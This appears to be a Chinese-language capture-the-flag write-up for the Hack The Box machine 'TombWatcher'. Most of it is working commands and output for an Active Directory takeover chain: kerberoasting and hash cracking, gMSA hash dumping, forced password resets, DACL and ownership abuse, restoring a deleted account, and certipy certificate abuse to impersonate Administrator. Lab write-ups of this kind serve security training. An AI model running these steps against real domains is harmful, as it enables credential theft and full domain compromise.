---
title: HTB-TombWatcher
categories: [ "Pentest" ]
tags: [ "Pentesting" ]
---

# TombWatcher

> Domain User: henry / H3nry_987TGV!

**Attackter Kali:** 10.10.16.19

**Target:**  10.129.62.74

## 信息收集：

- 端口扫描

  ```bash
   sudo nmap -sS -Pn -p1-65535 10.129.62.74
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250613225625-9wfvlap.png)
- 域信息收集

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250614235311-9mgxv4g.png)

## 横向移动

- WriteSPN

  > The user HENRY@TOMBWATCHER.HTB has the ability to write to the "serviceprincipalname" attribute to the user ALFRED@TOMBWATCHER.HTB.
  >

  ```bash
  ──(hello㉿world)-[~/Desktop]
  └─$ bloodyAD -d "tombwatcher.htb" --host "10.129.29.246" -u "henry" -p "H3nry_987TGV\!" set object "ALFRED" servicePrincipalName -v 'MSSQLSvc/DC01.tombwatcher.htb:1433'
  [+] ALFRED's servicePrincipalName has been updated
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615000633-yza61g2.png)

  > 同步dc ntp server
  >

  ```bash
  sudo su 
  timedatectl set-ntp off
  ntpdate -n DC01.tombwatcher.htb
  ```

  > 获取TG
  >

  ```bash
  └─$ nxc ldap "10.129.29.246" -d "tombwatcher.htb" -u "henry" -p "H3nry_987TGV\!" --kerberoasting kerber.txt
  SMB         10.129.29.246   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
  LDAP        10.129.29.246   389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
  LDAP        10.129.29.246   389    DC01             Bypassing disabled account krbtgt 
  LDAP        10.129.29.246   389    DC01             [*] Total of records returned 1
  LDAP        10.129.29.246   389    DC01             sAMAccountName: Alfred memberOf:  pwdLastSet: 2025-05-12 11:17:03.526670 lastLogon:<never>
  LDAP        10.129.29.246   389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$ac650f3d514ed1df4c535af624c0332e$e813a74002d71f93460ac56fffde0e5480bd170be93f9293ab21f270dc2910c97bb46cbc4e290f9e64591521e1ee31c4fb8c3ed795a756c76f44f2bf8344f902ab05460960a143eeaac8d36d31acbd00aed27e58f3f9ae1fbc3130ccdf69f2179453abf9632df2331f8a91f290cda1a80537d35f5009c50f499be88220b1d6c8979b091986ebed45fd51985ba7d613df6722382ad7d4db5cf59f484f430b95a1e55bdeac35b6644cd674d76071beb3b3a0e4c4ffb7ae8ccf8ed62acd129f0d74ea3bd517660d8ab1aca666e5fc7dcc52b1b03080092e90bd8638a0b2c72809e76b09ea647d086aa80b3e9ab84f2927810537e80abeff9baa2d2b6e4b9aa56e25bdae871bd18f1046b974ac7cf4ad3272ef0af5a1486873d23e0f1b73ef93b00151822b21090144d98dc58de2abbc5017170ea7cdf14e2087ddccc253b214d41728d2959847c631a6c61ff64c45ad3cddff6ae5596989311b482d013fbdda40a2ab07554f48725ae0390656f2927ff380ac14c184cddf1ce640b08eeecd52b9375fb2123474df4308961c7b6dabd4ee74b8bcc198c7a75074b517e0141c5904f6933a9edda6a31dab8f0f83c3e160bfc2e98247c1d42a9f689e47b7c6e6c0a38d9301d3f59009384a0e88ab97d2eba7767e1032474608c7168830032e89dc65243bc0bf1d1b488dcb433c63333f599394643096940400565d3d7f7ddee29edc47e082e2ce5edce018528f49dca353441ef8ff4fb1b3978c3915f58b90436866008eba2f271fd8dbf8fd1ceeac8ba6b10d24ae417bed877038b9e4495dcb196527e3a3d50567d02c15cc090c0b587c5f0e72433fcbdca5641f64e3733550aafd739c368323ee07ab89b4a09cd0287de48c33d54da8106333a8ec2042939ed80f1fc1e592f8a21aa7eb74b335b5c0fede52f7f4c97f04e1f1bfdc6726f3895039c6b6a76a37bccd4e9d7c5c501f85424ead716f6b2a7d571358f741e65a2ddee1941aad3fd42436032879e87fae4e9e8dcfc5eabcac6961a13f864f66a9d0884b8b52d7cd4c15c8f6d9062575976501885b6b249bd4db08cd48d3d571d664236cc7dd456100643d0ff737cd835c206942edd0b07ae08eb21917752f8bd989be0dfe2bb393a8f0dcb7e1d4ff247c7f6d0eb54f13522e26b6c49c6e27d94b2265ce1bccdb275d082d77969142f3e6cfdbc2bb0b09d36ae16feca30dab9f2160b63e51ae8affa6cfb0ac4ea107d613f10e6f8580b6df0dde0658542e144a88c34d798243a422a599c0bd40ae5dc773c3d857f7db4b7f1a7aab96c1c0c39abae23658b224bf91392e20b68ab7eb3fc4a7e5f4243f4e06fe0964a41a797a9f055542bb973ebd1ecc84680a9443441b605029c398f2ffc81aabc3c5be0919b9f37d139dd489a1080bdbc2f3db5afb26ada437d9e94da61d3cc6df46e10bce694c7372d505487c8f7346139f354e87ed5c6e1757c0a08fcb52ea
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615003623-y05xlj6.png)

  > Brute
  >

  ```bash
  hashcat -m 13100 spn_hash /usr/share/wordlists/rockyou.txt
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615004055-1bdk5r8.png)

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615003912-ikbpf7z.png)

  获取第二个用户账户权限，用户名:**Alfred**	密码:**basketball**

  alfred对INFRASTRUCTURE组有AddSelf权限，可以将alfred自身加入目标INFRASTRUCTURE组

  ```bash
  └─$ bloodyAD -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.129.29.246 add groupMember INFRASTRUCTURE alfred
  [+] alfred added to INFRASTRUCTURE
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615091226-g4gjyy2.png)

  > INFRASTRUCTURE组对ANSIBLE_DEV 用户有readGMSAPassword权限，而刚才alfred已经加入INFRASTRUCTURE组，alfred同样对ANSIBLE_DEV 用户有readGMSAPassword权限，获取ntlm hash
  >

  ```bash
  └─$ sudo python gMSADumper.py -u 'ALFRED' -p 'basketball' -d 'tombwatcher.htb'                                         
  Users or groups who can read password for ansible_dev$:
   > Infrastructure
  ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439
  ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
  ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
  ```

  > ansible_dev$机器账户，又发现其对SAM账户有**ForceChangePassword**权限，可以强制修改SAM的密码
  >

  ```bash
  └─$ net rpc password "SAM" "HackTheBox" -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"4b21348ca4a9edff9689cdf75cbda439" -S "10.129.29.246"
  E_md4hash wrapper called.
  HASH PASS: Substituting user supplied NTLM HASH...
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615094714-0021xh0.png)

  ```bash
  └─$ netexec smb 10.129.29.246 -u sam -p HackTheBox
  SMB         10.129.29.246   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
  SMB         10.129.29.246   445    DC01             [+] tombwatcher.htb\sam:HackTheBox 
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615094741-7tdci28.png)

  > 账户John的所有权改为SAM
  >

  ```bash
  └─$ owneredit.py -action write -new-owner 'SAM' -target 'JOHN' 'tombwatcher.htb/SAM:HackTheBox'
  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

  [*] Current owner information below
  [*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
  [*] - sAMAccountName: sam
  [*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb
  [*] OwnerSid modified successfully!
  ```

  > 获取john完全控制权限
  >

  ```bash
  └─$ dacledit.py -action 'write' -rights 'FullControl' -principal 'SAM' -target 'JOHN' 'tombwatcher.htb'/'SAM':'HackTheBox'
  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

  [*] DACL backed up to dacledit-20250615-020523.bak
  [*] DACL modified successfully!
  ```

  > 修改john用户密码
  >

  ```bash
  └─$ net rpc password "JOHN" "HackTheBox" -U "tombwatcher.htb"/"SAM"%"HackTheBox" -S 10.129.29.246
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615101719-9fhs31z.png)

  > 登录
  >

  ```bash
  └─$ netexec smb 10.129.29.246 -u john -p HackTheBox
  SMB         10.129.29.246   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
  SMB         10.129.29.246   445    DC01             [+] tombwatcher.htb\john:HackTheBox 
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615102102-wwyetn5.png)

  ```bash
  evil-winrm -u john -p HackTheBox -i 10.129.29.246
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615102130-0jvpw2q.png)

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615102143-49ovpyt.png)

  > 攻击路线 Review
  >

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250615165027-xxwqdxk.png)

## 域内权限提升

- 域内删除对象

  ```bash
  *Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *


  accountExpires                  : 9223372036854775807
  badPasswordTime                 : 0
  badPwdCount                     : 0
  CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
  CN                              : cert_admin
                                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
  codePage                        : 0
  countryCode                     : 0
  Created                         : 11/15/2024 7:55:59 PM
  createTimeStamp                 : 11/15/2024 7:55:59 PM
  Deleted                         : True
  Description                     :
  DisplayName                     :
  DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
  dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
  givenName                       : cert_admin
  instanceType                    : 4
  isDeleted                       : True
  LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
  lastLogoff                      : 0
  lastLogon                       : 0
  logonCount                      : 0
  Modified                        : 11/15/2024 7:57:59 PM
  modifyTimeStamp                 : 11/15/2024 7:57:59 PM
  msDS-LastKnownRDN               : cert_admin
  Name                            : cert_admin
                                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
  nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
  ObjectCategory                  :
  ObjectClass                     : user
  ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
  objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
  primaryGroupID                  : 513
  ProtectedFromAccidentalDeletion : False
  pwdLastSet                      : 133761921597856970
  sAMAccountName                  : cert_admin
  sDRightsEffective               : 7
  sn                              : cert_admin
  userAccountControl              : 66048
  uSNChanged                      : 12975
  uSNCreated                      : 12844
  whenChanged                     : 11/15/2024 7:57:59 PM
  whenCreated                     : 11/15/2024 7:55:59 PM

  accountExpires                  : 9223372036854775807
  badPasswordTime                 : 0
  badPwdCount                     : 0
  CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
  CN                              : cert_admin
                                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
  codePage                        : 0
  countryCode                     : 0
  Created                         : 11/16/2024 12:04:05 PM
  createTimeStamp                 : 11/16/2024 12:04:05 PM
  Deleted                         : True
  Description                     :
  DisplayName                     :
  DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
  dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
  givenName                       : cert_admin
  instanceType                    : 4
  isDeleted                       : True
  LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
  lastLogoff                      : 0
  lastLogon                       : 0
  logonCount                      : 0
  Modified                        : 11/16/2024 12:04:21 PM
  modifyTimeStamp                 : 11/16/2024 12:04:21 PM
  msDS-LastKnownRDN               : cert_admin
  Name                            : cert_admin
                                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
  nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
  ObjectCategory                  :
  ObjectClass                     : user
  ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
  objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
  primaryGroupID                  : 513
  ProtectedFromAccidentalDeletion : False
  pwdLastSet                      : 133762502455822446
  sAMAccountName                  : cert_admin
  sDRightsEffective               : 7
  sn                              : cert_admin
  userAccountControl              : 66048
  uSNChanged                      : 13171
  uSNCreated                      : 13161
  whenChanged                     : 11/16/2024 12:04:21 PM
  whenCreated                     : 11/16/2024 12:04:05 PM

  accountExpires                  : 9223372036854775807
  badPasswordTime                 : 0
  badPwdCount                     : 0
  CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
  CN                              : cert_admin
                                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
  codePage                        : 0
  countryCode                     : 0
  Created                         : 11/16/2024 12:07:04 PM
  createTimeStamp                 : 11/16/2024 12:07:04 PM
  Deleted                         : True
  Description                     :
  DisplayName                     :
  DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
  dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
  givenName                       : cert_admin
  instanceType                    : 4
  isDeleted                       : True
  LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
  lastLogoff                      : 0
  lastLogon                       : 0
  logonCount                      : 0
  Modified                        : 11/16/2024 12:07:27 PM
  modifyTimeStamp                 : 11/16/2024 12:07:27 PM
  msDS-LastKnownRDN               : cert_admin
  Name                            : cert_admin
                                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
  nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
  ObjectCategory                  :
  ObjectClass                     : user
  ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
  objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
  primaryGroupID                  : 513
  ProtectedFromAccidentalDeletion : False
  pwdLastSet                      : 133762504248946345
  sAMAccountName                  : cert_admin
  sDRightsEffective               : 7
  sn                              : cert_admin
  userAccountControl              : 66048
  uSNChanged                      : 13197
  uSNCreated                      : 13186
  whenChanged                     : 11/16/2024 12:07:27 PM
  whenCreated                     : 11/16/2024 12:07:04 PM
  ```
- 恢复账号

  ```bash
  Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
  bloodyAD --host 10.10.11.72 -u john -p HackTheBox -d tombwatcher.htb remove uac cert_admin -f ACCOUNTDISABLE
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250630133224-610cjd7.png)
- 更改密码

  ```bash
  bloodyAD --host 10.10.11.72 -u john -p HackTheBox -d tombwatcher set password cert_admin HackTheBox
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250630133332-z83i29r.png)
- 证书利用

  检测

  ```bash
  certipy-ad find -u 'cert_admin' -p 'HackTheBox' -dc-ip '10.10.11.72' -vulnerable -text -enabled
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250713200717-y9ngr3y.png)

  利用

  ```bash
  certipy-ad req \
      -u 'cert_admin@tombwatcher.htb' -p 'HackTheBox' \
      -dc-ip '10.129.238.123' -target 'DC01.tombwatcher.htb' \
      -ca 'tombwatcher-CA-1' -template 'WebServer' \
      -upn 'administrator@tombwatcher.htb'  \
      -application-policies 'Client Authentication'
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250713201158-pkj7lqp.png)

  证明

  ```bash
  certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.238.123' -ldap-shell
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250713201327-7i156uz.png)

  登录

  ```伪代码
  evil-winrm -u Administrator -p HackTheBox -i 10.129.238.123
  ```

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250713201434-phxvrhf.png)

  获取Flag

  ![image](assets/posts/2025-06-15-HTB-TombWatcher/image-20250713201619-xyk8tzx.png)



‍










‍
